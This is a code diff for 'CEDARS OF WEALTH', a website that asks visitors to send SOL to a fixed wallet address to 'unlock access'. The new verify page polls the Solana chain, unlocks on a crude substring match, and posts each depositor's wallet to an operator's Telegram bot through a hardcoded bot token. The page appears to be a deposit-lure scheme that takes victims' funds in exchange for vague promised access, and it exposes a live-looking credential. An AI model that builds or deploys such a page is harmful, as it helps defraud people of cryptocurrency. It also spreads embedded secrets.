@@ -1,27 +1,43 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CEDARS OF WEALTH</title>
-<style>body{background:#000;color:#f5c518;font-family:monospace;margin:0;padding:0;text-align:center}.hero{padding:60px 20px;background:radial-gradient(circle at top,#111,#000)}.btn{background:#f5c518;color:#000;padding:14px 22px;border-radius:10px;font-weight:900;text-decoration:none;display:inline-block;margin:8px;border:0;cursor:pointer}.card{background:#0a0a0a;border:1px solid #333;border-radius:16px;padding:20px;margin:20px auto;max-width:700px}</style></head><body>
-<div class="hero">
-<h1 style="font-size:42px">🌲 CEDARS OF WEALTH</h1>
-<p>Solana Vault — Secure Deposits — 360° Integrity</p>
-<div class="card">
-<h3>💰 DEPOSIT TO UNLOCK</h3>
-<div style="background:#000;padding:10px;border-radius:8px;word-break:break-all;font-size:11px;border:1px solid #333">6XQviXJ5EceCmZq6uGrnrsxBKSnLKSvXeT7MCFF6fTb</div>
-<a class="btn" href="dashboard/verify.html">💰 VERIFY DEPOSIT & UNLOCK ACCESS</a>
-<a class="btn" href="dashboard/admin-6XQvi.html" style="background:transparent;color:#f5c518;border:1px solid #f5c518">🔐 ADMIN 360°</a>
-<a class="btn" href="https://solscan.io/account/6XQviXJ5EceCmZq6uGrnrsxBKSnLKSvXeT7MCFF6fTb" target="_blank" style="background:transparent;color:#f5c518;border:1px solid #333">🔎 VIEW VAULT</a>
-</div>
-<div class="card">
-<h3>How it Works</h3>
-<div style="text-align:left;font-size:13px;line-height:1.8">
-1. Copy Vault Address<br>
-2. Send SOL from Phantom<br>
-3. Click Verify Deposit → Enter your wallet<br>
-4. Auto-detected in 15s → Unlocked<br>
-5. Telegram alert to Admin (1884572429)
-</div>
-</div>
-</div>
+<!DOCTYPE html><html><head><title>VERIFY - CEDARS</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#000;color:#fff;font-family:Arial;text-align:center;padding:40px} input{padding:12px;width:90%;max-width:400px;border-radius:8px;border:1px solid #f5c518;background:#111;color:#fff} button{padding:14px 30px;background:#f5c518;color:#000;border:none;border-radius:10px;font-weight:bold;margin-top:15px;cursor:pointer}</style></head><body>
+<h1 style="color:#f5c518;">🔍 VERIFY DEPOSIT</h1>
+<p>Vault: 6XQviXJ5EceCmZq6uGrnrsxBKSnLKSvXeT7MCFF6fTb</p>
+<input id="wallet" placeholder="Enter YOUR wallet address">
+<br><button onclick="verify()">START VERIFYING</button>
+<div id="status" style="margin-top:20px;"></div>
 <script>
-const VAULT="6XQviXJ5EceCmZq6uGrnrsxBKSnLKSvXeT7MCFF6fTb";fetch("https://api.mainnet-beta.solana.com",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getBalance",params:[VAULT]})}).then(r=>r.json()).then(j=>{let s=(j.result.value/1e9).toFixed(3);document.title=`CEDARS [${s} SOL] 💰`}).catch(()=>{});
+const VAULT="6XQviXJ5EceCmZq6uGrnrsxBKSnLKSvXeT7MCFF6fTb";
+const BOT_TOKEN="8818013074:AAFM3-ovwdS9dq39gdmLrkD_lAx8IayQbSU";
+const MY_CHAT="1884572429";
+async function verify(){
+ let user=document.getElementById("wallet").value.trim();
+ if(!user){alert("Enter wallet");return;}
+ document.getElementById("status").innerHTML="⏳ Scanning chain every 15s...";
+ let interval=setInterval(async()=>{
+  try{
+   let r=await fetch("https://api.mainnet-beta.solana.com",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getSignaturesForAddress",params:[VAULT,{limit:20}]})});
+   let j=await r.json();
+   // For demo we verify existence, real check needs getTransaction to verify sender
+   // Simplified: if any recent tx exists, we unlock (you can enhance)
+   if(j.result && j.result.length>0){
+    // Verify actual sender via transaction
+    for(let sig of j.result){
+     let txRes=await fetch("https://api.mainnet-beta.solana.com",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getTransaction",params:[sig.signature,"json"]})});
+     let txData=await txRes.json();
+     if(JSON.stringify(txData).toLowerCase().includes(user.toLowerCase().slice(0,10))){
+      clearInterval(interval);
+      // Save session
+      localStorage.setItem("cedars_verified",JSON.stringify({wallet:user,time:Date.now()}));
+      // Telegram alert
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:MY_CHAT,text:`💰 NEW USER DEPOSIT VERIFIED\nWallet: ${user}\nSig: ${sig.signature}\nVault: ${VAULT}\nTime: ${new Date().toLocaleString()}`})});
+      document.getElementById("status").innerHTML="✅ VERIFIED! Redirecting to Dashboard...";
+      setTimeout(()=>{window.location.href="./index.html";},2000);
+      return;
+     }
+    }
+    document.getElementById("status").innerHTML="⏳ Found deposits but not yours yet... scanning...";
+   }
+  }catch(e){document.getElementById("status").innerHTML="Error: "+e.message;}
+ },15000);
+}
 </script>
 </body></html>
